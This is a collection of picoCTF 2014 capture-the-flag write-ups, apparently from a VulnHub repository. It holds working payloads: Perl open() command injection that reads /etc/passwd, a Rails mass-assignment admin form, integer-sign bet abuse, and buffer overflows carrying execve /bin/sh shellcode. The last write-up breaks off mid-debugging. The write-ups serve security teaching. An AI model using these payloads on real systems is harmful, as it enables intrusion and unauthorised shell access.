{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/low-entropy.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/low-entropy.md", "content": "### Solved by barrebas\n\nLow Entropy is a 110 point challenge. \n\nWe are given a server to connect to and a pcap file. We need to decrypt the message found in the pcap file. This message was encoded with a private RSA key. \n\n```bash\nWelcome to the Thyrin drop box. Please send your public key and message.\nPublic key: c20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f\nMessage: 49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e\n```\n\nThe server spits out the product of two primes, which gives us a lot of possible public keys. We need to find the factors `p` and `q`, the factors of the captured public key. If we have those factors, it's game over. Luckily, the server has only 30 primes to choose from. That means that there are 30 * 29 / 2 = 435 possible keys. Let's first grab all these products of `p` and `q` and store them:\n\n```python\n#!/usr/bin/python\nfrom socket import *\n\nwhile (len(products)<30*29):\n\ts=socket(AF_INET, SOCK_STREAM)\n\ts.connect(('vuln2014.picoctf.com',51818))\n\n\t# banner\n\ts.recv(1024)\n\n\tpq = s.recv(256)\n\tpq = long(\"0\"+pq, 16)\n\t\n\tif pq and not pq in products:\n\t\twith open('public_keys', 'a') as f:\n\t\t\tf.write(str(pq)+\"\\n\")\n\t\tf.close()\n\t\t\t\t\n\t\tproducts.add(pq)\n\t\n\tprint \"Now at {} products...\".format(len(products))\n\ts.close()\n```\n\nThis should grab the 435 unique public keys. Next, we need to find the primes that constitute the captured public key. Basically, we have a list of `a1*a2, a1*a3, a2*a3...` for 30 unique primes. Let's assume the captured public key is derived from the values `a1` and `a2`. Given a large list of other values ax*ay and some math, we can say that there are values that satisfy:\n\n`\n(a1*a2 / (a1*a3) * a2*a3 == a2*a2\n`\n\nTherefore, we can extract the squared values of each prime! I skipped using `math.sqrt()` and python `float` values, as these do not have the required precision given these extremely large numbers. Let's generate all these squared values from each key we got from the server. Then, divide the square of the public key by each entry. If the result is also in the list of squared primes, then we have a match!\n\n```python\n#!/usr/bin/python\n    \nwith open('public_keys') as f:\n\tdata = f.readlines()\n\tf.close()\n\t\nalice_key = 0xc20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f\n\npublic_keys = set([])\nfor line in data:\n\tif len(line.strip()):\n\t\tpublic_keys.add(int(line.strip()))\n\t\nsquares = set([])\t# sets are fast :)\nfor key_a in public_keys:\n\tfor key_b in public_keys - set([key_a]):\n\t\tsquares.add((alice_key * key_a) / key_b)\n\t\t\nfor k in squares:\n\tl = alice_key**2 / k\n\tif l in squares:\n\t\tif alice_key**2 == l*k:\t# double-check to prevent rounding errors\n\t\t\tprint \"[!] Found k={}\\nl={}\\n\".format(k, l)\n```\n\nIt should return two values for k and l (because k could be l and vice-versa):\n\n```bash\n[!] Found k=145636797632612493383437910621935492258871220486831431433846443881029756884131014317442568196356163696603884037401628766885574744524908524694664229202327755975190209777333222305357215356711196812874146485202755534755335009504417851499146840024376285929565498060947342673068738915934424594894642178132393803401\nl=127485391417645634265899520100348459764415230949848696681516013917289651283750339673156991958225605417057264644648275442237083380079695308054967054357615028357457990698626856902554884944611614631356998904650004684028810140797701724207511157802310732003918967758266191880635014381653257954124503965122532941561\n```\n\nNow, all we have to do is take the square root of these values to get `p` and `q`! Luckily, [Newton's algorithm](http://stackoverflow.com/questions/15390807/integer-square-root-in-python/15391420#15391420) works perfectly for integers. The server gave us the public exponent (2^16+1) so we are all set for decrypting the message:\n\n```python\n#!/usr/bin/python\n\ndef isqrt(n):\n    x = n\n    y = (x + 1) // 2\n    while y < x:\n        x = y\n        y = (x + n // x) // 2\n    return x\n\ndef egcd(a, b):\n\tif a == 0:\n\t\treturn (b, 0, 1)\n\telse:\n\t\tg, y, x = egcd(b % a, a)\n\t\treturn (g, x - (b // a) * y, y)\n\ndef modinv(a, m):\n\tg, x, y = egcd(a, m)\n\tif g != 1:\n\t\traise Exception('modular inverse does not exist')\n\telse:\n\t\treturn x % m\n\t\t\ne = 2**16+1\nk = 127485391417645634265899520100348459764415230949848696681516013917289651283750339673156991958225605417057264644648275442237083380079695308054967054357615028357457990698626856902554884944611614631356998904650004684028810140797701724207511157802310732003918967758266191880635014381653257954124503965122532941561\nl = 145636797632612493383437910621935492258871220486831431433846443881029756884131014317442568196356163696603884037401628766885574744524908524694664229202327755975190209777333222305357215356711196812874146485202755534755335009504417851499146840024376285929565498060947342673068738915934424594894642178132393803401\n\np = isqrt(k)\nq = isqrt(l)\nc = 0x49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e\n\nn = p*q\ntot = (p - 1) * (q - 1)\nd = modinv(e, tot)\n\nm = pow(c, d, n)\nprint hex(m)\n```\n\nThis gives us the decoded hexadecimal representation of the message. Running it through `xxd`:\n\n```bash\nbas@tritonal:~/tmp/picoctf/low_entropy$ python solve.py \n0x476f6f64207468696e67206e6f206f6e652063616e207265616420746869732120492764206861746520666f72207468656d20746f206b6e6f7720746861742074686520666c6167206973206d616b655f737572655f796f75725f726e675f67656e6572617465735f6c6f7473615f7072696d65732eL\nbas@tritonal:~/tmp/picoctf/low_entropy$ xxd -r -p\n476f6f64207468696e67206e6f206f6e652063616e207265616420746869732120492764206861746520666f72207468656d20746f206b6e6f7720746861742074686520666c6167206973206d616b655f737572655f796f75725f726e675f67656e6572617465735f6c6f7473615f7072696d65732e\nGood thing no one can read this! I'd hate for them to know that the flag is make_sure_your_rng_generates_lotsa_primes.\n```\n\nThe flag is `make_sure_your_rng_generates_lotsa_primes`.\n", "timestamp": "2025-10-24T11:40:16.598591"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/make-a-face.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/make-a-face.md", "content": "### Solved by Swappage and barrebas\n\nMake a Face is a 100 point challenge. \n\nWe need to exploit a perl script running on a Webpage. This script takes user input and generates an \"avatar\". We immediately figured Shellshock but this turned out to be wrong. The script is included in the webpage source:\n\n```perl\n#!/usr/bin/perl\n\nuse CGI;\n\n$q = new CGI;\nif (defined($q->param('Head'))) {\n  print $q->header(-type=>'image/bmp');\n  open(HEAD,\"head\".$q->param('Head'));\n  open(HAIR,\"hair\".$q->param('Hair'));\n  open(NOSE,\"nose\".$q->param('Nose'));\n  open(MOUTH,\"mouth\".$q->param('Mouth'));\n  open(EYES,\"eyes\".$q->param('Eyes'));\n\n  while (read(HEAD,$headb,1)) {\n    read(HAIR,$hairb,1);\n    read(NOSE,$noseb,1);\n    read(MOUTH,$mouthb,1);\n    read(EYES,$eyesb,1);\n    print (chr (ord($headb)&ord($hairb)&ord($noseb)&ord($mouthb)&ord($eyesb)));\n  }\n}\nelse {\n  print $q->header;\n\t...generate page...\n```\n\nWe can't really inject anything into the parameter fields, as the value is concatenated with \"head\", \"hair\", etc. No calls to `system` or `eval` are made, no backticks were used. However, perl being perl, has another [trick up it's sleeve](http://www.cgisecurity.com/lib/sips.html):\n\n`\nIf the filename begins with \"|\", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a \"|\", the filename is interpreted as a command which pipes output to us.\n`\n\nThat's handy! Let's try it:\n\n```bash\nbas@tritonal:~$ curl \"http://makeaface.picoctf.com/index.cgi?Head=%20/etc/passwd|&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=3.bmp\"\nBM....binnologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n```\n\nIt returns a few lines of /etc/passwd, albeit mangled a bit. This works, because the \"head\" parameter is used in the open statement like this:\n\n```perl\nopen(HEAD,\"head /etc/passwd|\"); \n```\n\nThis makes perl believe that it is a command from which we want to see output! From here, we enumerated the webdirectory and Swappage came up with the brilliant solution:\n\n```bash\nbas@tritonal:~$ curl \"http://makeaface.picoctf.com/index.cgi?Head=%20|cat%20/etc/passwd%26%26ls%20-la|&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=3.bmp\"\nBM...hex bytes...binnologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlibuuid:x:100:101::/var/lib/libuuid:\nsyslog:x:101:104::/home/syslog:/bin/false\nmessagebus:x:102:106::/var/run/dbus:/bin/false\nlandscape:x:103:109::/var/lib/landscape:/bin/false\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\npollinate:x:105:1::/var/cache/pollinate:/bin/false\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\ntotal 228\ndrwxr-xr-x 2 root root 4096 Oct 27 03:57 .\ndrwxr-xr-x 3 root root 4096 Oct 27 03:47 ..\n-rw-r--r-- 1 root root   34 Oct 27 03:48 SECRET_KEY_2b609783951a8665d8c67d721b52b0f8\n-rw-r--r-- 1 root root  452 Oct 27 03:48 css.css\n-rw-r--r-- 1 root root 8338 Oct 27 03:48 eyes1.bmp\n-rw-r--r-- 1 root root 8338 Oct 27 03:48 eyes2.bmp\n-rw-r--r-- 1 root root 8338 Oct 27 03:48 eyes3.bmp\n-rw-r--r-- 1 root root 8338 Oct 27 03:48 eyes4.bmp\n-rw-r--r-- 1 root root 8338 Oct 27 03:48 hair0.bmp\n```\nBecause that file, `SECRET_KEY_2b609783951a8665d8c67d721b52b0f8` is world-readable and in the webdirectory, we could just browse to it and grab the flag: `why_did_we_stop_using_perl_again?`\n", "timestamp": "2025-10-24T11:40:16.710864"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/massive-fail.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/massive-fail.md", "content": "### Solved by barrebas\n\nMassive Fail is a 120 point challenge. \n\n`Fed up with their recent PHP related issues, Daedalus Corp. has switched their website to run on Ruby on Rails (version 3.1.0) instead. Their brand new registration page does not seem like much of an improvement though... [Source].`\n\nWe're given the source to a Ruby on Rails website. We need to register as an admin to get the flag. The interesting bit is in `db/schema.rb` and `app/controller/user_controller.rb`.\n\n```\nActiveRecord::Schema.define(:version => 20141008175655) do\n\n  create_table \"users\", :force => true do |t|\n    t.string   \"username\"\n    t.string   \"password\"\n    t.string   \"name\"\n    t.boolean  \"is_admin\"\n    t.datetime \"created_at\"\n    t.datetime \"updated_at\"\n  end\n\nend\n\nclass UserController < ApplicationController\n  def register     \n  end\n\n  def create\n    # User.new creates a new user according to ALL the parameters\n    @new_user = User.new(params[:user])\n    @new_user.save\n  end\nend\n```\n\nThe application registers the user using *ALL* supplied parameters. So let's supply a few more, shall we? Download the registration page and \"tweak\" it a bit:\n\n```html\n<form accept-charset=\"UTF-8\" action=\"http://web2014.picoctf.com:5000/user/create\" method=\"post\"><div style=\"margin:0;padding:0;display:inline\"><input name=\"utf8\" type=\"hidden\" value=\"&#x2713;\" /><input name=\"authenticity_token\" type=\"hidden\" value=\"+yYhUookKb5lZuf2bU97ccd3TWYizvaxFYpWfR5H/b8=\" /></div>\n  <div class=\"control-group\">\n    <label class=\"control-label\" for=\"user_name\">Name</label>:\n    <div class=\"controls\">\n      <input id=\"user_name\" name=\"user[name]\" size=\"30\" type=\"text\" />\n    </div>\n  </div>\n\n  <div class=\"control-group\">\n    <label class=\"control-label\" for=\"user_username\">Username</label>:\n    <div class=\"controls\">\n      <input id=\"user_username\" name=\"user[username]\" size=\"30\" type=\"text\" />\n    </div>\n  </div>\n\n  <div class=\"control-group\">\n    <label class=\"control-label\" for=\"user_password\">Password</label>:\n    <div class=\"controls\">\n      <input id=\"user_password\" name=\"user[password]\" size=\"30\" type=\"password\" />\n    </div>\n  </div>\n    <div class=\"control-group\">\n    <label class=\"control-label\" for=\"user_is_admin\">is_admin</label>:\n    <div class=\"controls\">\n      <input id=\"user_password\" name=\"user[is_admin]\" size=\"30\" type=\"text\" value=\"1\" />\n    </div>\n  </div>\n```\n\nBy adding the `user[is_admin]` parameter, the register page thinks we are admin and gives us the flag:\n\n![](/images/2014/pico/massive-fail/daedelus.png)\n", "timestamp": "2025-10-24T11:40:16.850420"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/netsino.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/netsino.md", "content": "### Solved by barrebas\n\nNetsino is a 120 point challenge. \n\n`\nDaedalus seems to have ties to a shady online gambling boss. Maybe if \nyou beat him at his own game, you can persuade him to share some useful \ninfo. The server is running on vuln2014.picoctf.com:4547 and the source \ncode can be found here.\n`\n\nWe are presented with an online gambling program. You randomly get some cash and have to gamble against the boss. The following code takes your betsize:\n \n```c\nlong getbet() {\n    while(1) {\n        printf(\"You've got $%lu. How much you wanna bet on this next toss?\\n\", player_cash);\n        long bet = getnum(); \n        if(bet <= player_cash) {\n            return bet;\n        } else {\n            puts(\"Yerr can't bet more than ya got!\");\n        }\n    }\n}\n```\nThe object is to win all the boss' money, so he'll give you the flag. Unfortunately, the program is coded pretty securely. Furthermore, the odds of winning aren't favorable. Luckily for us, the program makes a mistake when reading in the betsize. If we supply a large enough value, then the number being read will be negative. The program does not check for this. So let's supply `0xf0000000`, which is 4026531840. For the c program, however, it will be a negative number. Thus, the betsize check will pass, because -268435445 is less than your total amount. Next, all we have to do is lose:\n\n```c\nvoid play(long choice, long bet, int x, int y) {\n    switch(choice) {\n\t\t//...snip...\n        case 5: if(x == 1 && y == 1) {\n                player_cash += 36*bet;\n                boss_cash -= 36*bet;\n                puts(wins[rand()%3+7]);\n            } else {\n                puts(loses[rand()%3+7]);\n            }\n            break;\n```\n\nBy betting on snake-eyes (a very slim chance of that happening), the program will subtract the betsize times 36 from our cash and add that same amount to the boss' money. However, we supplied a very large negative number for the betsize, meaning that we actually *get* money and the boss loses money. Rinse & repeat this a couple of times to get the flag:\n\n```\nbas@tritonal:~$ nc vuln2014.picoctf.com 4547\nArr, git ye into me casio, the hottest gamblin' sensation on the net!\nHere, have a fiver, and let's gamble!\nYou've got $5. How much you wanna bet on this next toss?\n> 4026531840\n1: EVEN. Win your bet back plus an additional $4026531840 if the dice sum even.\n2: ODDS. Win your bet back plus an additional $3489660928 if both dice roll odd.\n3: HIGH. Win your bet back plus an additional $2952790016 if the dice sum to 10 or more.\n4: FOUR. Win your bet back plus an additional $2147483648 if the dice sum to four.\n5: EYES. Win your bet back plus an additional $3489660928 on snake eyes.\nWhat'll it be?\n> 5\nLets rock 'n' roll!\n5 3\nSnake eyes! ...not.\nYou've got $268435461. How much you wanna bet on this next toss?\n> 4026531840\n1: EVEN. Win your bet back plus an additional $4026531840 if the dice sum even.\n2: ODDS. Win your bet back plus an additional $3489660928 if both dice roll odd.\n3: HIGH. Win your bet back plus an additional $2952790016 if the dice sum to 10 or more.\n4: FOUR. Win your bet back plus an additional $2147483648 if the dice sum to four.\n5: EYES. Win your bet back plus an additional $3489660928 on snake eyes.\nWhat'll it be?\n> 5\nLets rock 'n' roll!\n5 4\nYou seem to enjoy loosing.\nYou've got $536870917. How much you wanna bet on this next toss?\n> 4026531840\n1: EVEN. Win your bet back plus an additional $4026531840 if the dice sum even.\n2: ODDS. Win your bet back plus an additional $3489660928 if both dice roll odd.\n3: HIGH. Win your bet back plus an additional $2952790016 if the dice sum to 10 or more.\n4: FOUR. Win your bet back plus an additional $2147483648 if the dice sum to four.\n5: EYES. Win your bet back plus an additional $3489660928 on snake eyes.\nWhat'll it be?\n> 5\nLets rock 'n' roll!\n2 1\nSnake eyes! ...not.\nYou've got $805306373. How much you wanna bet on this next toss?\n> 4026531840\n1: EVEN. Win your bet back plus an additional $4026531840 if the dice sum even.\n2: ODDS. Win your bet back plus an additional $3489660928 if both dice roll odd.\n3: HIGH. Win your bet back plus an additional $2952790016 if the dice sum to 10 or more.\n4: FOUR. Win your bet back plus an additional $2147483648 if the dice sum to four.\n5: EYES. Win your bet back plus an additional $3489660928 on snake eyes.\nWhat'll it be?\n> 5\nLets rock 'n' roll!\n4 3\nLike that was ever gonna happen.\nGreat, I'm fresh outta cash. Take this flag instead.\ni_wish_real_casinos_had_this_bug\nGit outta here.\n```\n", "timestamp": "2025-10-24T11:40:17.006731"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/nevernote.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/nevernote.md", "content": "### Solved by barrebas\n\nNevernote is a 180 point challenge. \n\n`\nIn light of the recent attacks on their machines, Daedalus Corp has \nimplemented a buffer overflow detection library. Nevernote, a program made\nfor Daedalus Corps employees to take notes, uses this library. Can you \nbypass their protection and read the secret? The binary can be found at\n /home/nevernote/ on the shell server.\n `\n\nThis program attempts to implement a stack canary in a rather dumb way:\n\n```c\nstruct canary{\n    int canary;\n    int *verify;\n};\n\n/* buffer overflow resistant buffer */\nstruct safe_buffer{\n    char buf[SAFE_BUFFER_SIZE];\n    struct canary can;\n};\n```\n\nSo we can overflow this `safe_buffer`, but then we also overwrite the canary. Then the canary check will not pass anymore:\n\n```c\nvoid verify_canary(struct canary *c){\n    if (c->canary != *(c->verify)){\n        printf(\"Canary was incorrect!\\n\");\n        __canary_failure(1);\n    }\n\n    // we're all good; free the canary and return\n    free(c->verify);\n    return;\n}\n```\n\nBut since we can overflow the buffer, we control both the canary and the pointer to the canary. This means we can make this check always succeed. Again, no ASLR on the target server allows us to use a static address. Let's supply the address of safe_buffer (the address of which can be obtained from debugging the binary with `gdb`). This is automated like so (it echoes a username and the command for adding a note):\n\n```\npico1139@shell:/home/nevernote$ (echo \"bleh\"; echo \"a\"; python -c 'print \"A\"*512+\"AAAA\"+\"\\x50\\xc0\\x04\\x08\"') > /tmp/in\n...snip...\n(gdb) r < /tmp/in\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/nevernote/nevernote < /tmp/in\nPlease enter your name: Enter a command: Write your note: Note added.\n*** Error in `/home/nevernote/nevernote': double free or corruption (!prev): 0x0804c050 ***\n```\n\nNow, the binary aborts because the pointer to the canary has already been freed. Not a problem, we won't let it come that far. Let's try to overflow the saved return address:\n\n```\npico1139@shell:/home/nevernote$ (echo \"bleh\"; echo \"a\"; python -c 'print \"A\"*512+\"AAAA\"+\"\\x50\\xc0\\x04\\x08CCCCCCCCCCCCCCCCDDDDEEEEFFFF\"') > /tmp/in\n...\n(gdb) r < /tmp/in\nStarting program: /home/nevernote/nevernote < /tmp/in\nPlease enter your name: Enter a command: Write your note: \nProgram received signal SIGSEGV, Segmentation fault.\n0xf7ea11f3 in ?? () from /lib/i386-linux-gnu/libc.so.6\n(gdb) i r\neax            0x45454545\t1162167621\necx            0xffffd414\t-11244\nedx            0x45454545\t1162167621\nebx            0x3f4\t1012\nesp            0xffffd3f0\t0xffffd3f0\nebp            0xffffd628\t0xffffd628\nesi            0xffffd420\t-11232\nedi            0x45454545\t1162167621\neip            0xf7ea11f3\t0xf7ea11f3\neflags         0x10282\t[ SF IF RF ]\ncs             0x23\t35\nss             0x2b\t43\nds             0x2b\t43\nes             0x2b\t43\nfs             0x0\t0\ngs             0x63\t99\n(gdb) x/i $eip\n=> 0xf7ea11f3:\tmovlpd %xmm1,(%edx)\n```\n\nRight, a segfault because `edx` points to a place that doesn't exist. Let's fix that by supplying the address of safe_buffer:\n\n```\npico1139@shell:/home/nevernote$ (echo \"bleh\"; echo \"a\"; python -c 'print \"A\"*512+\"AAAA\"+\"\\x50\\xc0\\x04\\x08CCCCCCCCCCCCCCCCDDDD\\x50\\xc0\\x04\\x08FFFF\"') > /tmp/in\n...\n(gdb) r < /tmp/in\nStarting program: /home/nevernote/nevernote < /tmp/in\nPlease enter your name: Enter a command: Write your note: \nProgram received signal SIGSEGV, Segmentation fault.\n0x44444444 in ?? ()\n```\n\nw00t! We have control over EIP! Since ASLR is off and so is NX, we can just jump a piece of shellcode. Let’s stick in the shellcode (23 bytes execve /bin/sh) and alter the canary to 4*0x90 (which is the start of the NOP sled). Let's overwrite EIP with `0x804c070` to jump in the middle of our NOP sled. We cat the payload & use another cat to keep shell alive:\n\n```\npico1139@shell:/home/nevernote$ (echo \"bleh\"; echo \"a\"; python -c 'print \"\\x90\"*(512-23)+\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"+\"\\x90\\x90\\x90\\x90\"+\"\\x50\\xc0\\x04\\x08CCCCCCCCCCCCCCCC\\x70\\xc0\\x04\\x08\\x50\\xc0\\x04\\x08FFFF\"') > /tmp/in\n\npico1139@shell:/home/nevernote$ (cat /tmp/in; cat) | ./nevernote\nPlease enter your name: Enter a command: Write your note: \nid\nuid=11066(pico1139) gid=1017(picogroup) egid=1011(nevernote) groups=1017(picogroup)\nwhoami\npico1139\ncat flag*\nthe_hairy_canary_fairy_is_still_very_wary\n```\n\nThe flag is `the_hairy_canary_fairy_is_still_very_wary`.\n", "timestamp": "2025-10-24T11:40:17.123793"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/no-overflow.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/no-overflow.md", "content": "### Solved by barrebas\n\nNo Overflow is a 140 point challenge. \n\nThis program tries to prevent buffer overflows by first asking for the input length. \n\n```bash\nbas@tritonal:~/tmp/picoctf$ ./no_overflow \nHow long is your name?\n10\nWhat is your name?\nBBBBBBBBBBBBBBBBBBBBBBBBBB\nHello, BBBBBBBBBBW\n```\n\nIt disregards the rest of the ouput. However, the program uses `scanf`. If we supply `-1` as the length, we can bypass the overflow check:\n\n```bash\nbas@tritonal:~/tmp/picoctf$ (echo -1; python -c 'print \"A\"*300') | ./no_overflow \nHow long is your name?\nWhat is your name?\nHello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...snip...\nSegmentation fault\n```\n\nFrom here, it is easy to control EIP:\n\n```bash\nbas@tritonal:~/tmp/picoctf$ (echo -1; python -c 'print \"A\"*268+\"BBBB\"'; echo) | ./no_overflow\nHow long is your name?\nWhat is your name?\nHello, AAAAAAAAAA...snip...\nSegmentation fault (core dumped)\nbas@tritonal:~/tmp/picoctf$ gdb no_overflow core\n...snip...\nCore was generated by `./no_overflow'.\nProgram terminated with signal 11, Segmentation fault.\n#0  0x42424242 in ?? ()\n```\n\nQuickly checking on the remote server if there is any protection on the binary:\n\n```bash\npico1139@shell:/home/no_overflow$ readelf -l no_overflow \n\nElf file type is EXEC (Executable file)\nEntry point 0x8048430\nThere are 9 program headers, starting at offset 52\n\nProgram Headers:\n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\n  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4\n  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1\n      [Requesting program interpreter: /lib/ld-linux.so.2]\n  LOAD           0x000000 0x08048000 0x08048000 0x0080c 0x0080c R E 0x1000\n  LOAD           0x000f08 0x08049f08 0x08049f08 0x0012c 0x00130 RW  0x1000\n  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4\n  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4\n  GNU_EH_FRAME   0x0006e0 0x080486e0 0x080486e0 0x0003c 0x0003c R   0x4\n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10\n  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1\n```\n\nThe stack is executable! Furthermore, ASLR is not enabled. This makes it easy to stick in a [shellcode](http://shell-storm.org/shellcode/files/shellcode-827.php) plus a NOP sled and return to an address on the stack:\n\n```bash\npico1139@shell:/home/no_overflow$ (echo -1; python -c 'print \"A\"*268+\"\\xd0\\xd6\\xff\\xff\"+\"\\x90\"*200+\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"'; cat) | ./no_overflow\nHow long is your name?\nWhat is your name?\nHello, AAAAAAAAAAAAAAAAAAAAAA...snip...\n\nid\nuid=11066(pico1139) gid=1007(no_overflow) groups=1017(picogroup)\ncat flag.txt\nwhat_is_your_sign\n```\n", "timestamp": "2025-10-24T11:40:17.242560"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/obfuscation.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/obfuscation.md", "content": "### Solved by barrebas\n\nObfuscation is a 150 point challenge. \n\nTough one. There are some anti-disassembler tricks in here. Upon running the program, it asks for a password. Let's first try to get a breakpoint somewhere:\n\n```\ngdb-peda$ b main\nFunction \"main\" not defined.\ngdb-peda$ b __libc_start_main\nBreakpoint 1 at 0x8048400\ngdb-peda$ r\n...\nBreakpoint 1, 0xf7e2c970 in __libc_start_main ()\n   from /lib/i386-linux-gnu/i686/cmov/libc.so.6\ngdb-peda$ x/2x $esp\n0xffffd58c:\t0x080484ed\t0x08048420\n```\n\nOur entry-point is `0x08048420`. Set a breakpoint and continue tracing. We encounter an anti-disassembly trick:\n\n```\n=> 0x804843a:\tjmp    0x804843b\n | 0x804843c:\tror    BYTE PTR [eax-0x39],0x44\n | 0x8048440:\tand    al,0x4\n | 0x8048442:\tpush   esp\n | 0x8048443:\tlea    eax,[eax+ecx*1]\n |->   0x804843b:\tinc    eax\n       0x804843d:\tdec    eax\n       0x804843e:\tmov    DWORD PTR [esp+0x4],0x8048d54\n       0x8048446:\tmov    DWORD PTR [esp],0x1\n```\n\nIt jumps one byte ahead, in the middle of the instruction, causing the disassembly of the next bytes to be incorrect. Luckily, this won't stop `gdb-peda`. Soon after, the program asks for a password:\n\n```\n=> 0x804846a:\tcall   0x80483c0 <getline@plt>\n   0x804846f:\ttest   eax,eax\n\n...\n\n0x0804846a in ?? ()\ngdb-peda$ b *0x804846f \nBreakpoint 2 at 0x804846f\n```\n\nI entered `012345678` and pressed enter. The program transfers control to the function at `0x8048580` which supposedly checks our password. Set a breakpoint and continue. The programs then takes a single byte from the password and does some checks:\n\n```\n   0x80485b6:\tmovzx  ebp,BYTE PTR [ebx+edx*1] # grab char\n   0x80485ba:\tmov    eax,ebp\n   0x80485bc:\tmovsx  ecx,al\n   0x80485bf:\tadd    ecx,0x40\n   0x80485c2:\tmov    edi,ecx\n   0x80485c4:\tsar    edi,0x1f                 # no idea what this \n   0x80485c7:\tshr    edi,0x19                 # is supposed to do.\n   0x80485ca:\tadd    ecx,edi\n   0x80485cc:\tand    ecx,0x7f                 # check for ASCII?\n   0x80485cf:\tsub    ecx,edi\n   0x80485d1:\tmov    BYTE PTR [esp+ecx*1+0xc],0x1\n   0x80485d6:\tlea    ecx,[ebp-0xa]            # subtract 0xa from char\n   0x80485d9:\tcmp    cl,0x70                  # check for below 'z'\n   0x80485dc:\tjbe    0x8048600\n```\n\nAnd then jumps to `0x8048600`. This piece is interesting, because it uses a jump-table (like in a switch statement). Depending on the value of (char - 0xa), it jumps to a code region:\n\n```\n=> 0x8048600:\tmovzx  ecx,cl\n   0x8048603:\tjmp    DWORD PTR [ecx*4+0x8048b90]\n\ngdb-peda$ x/400x 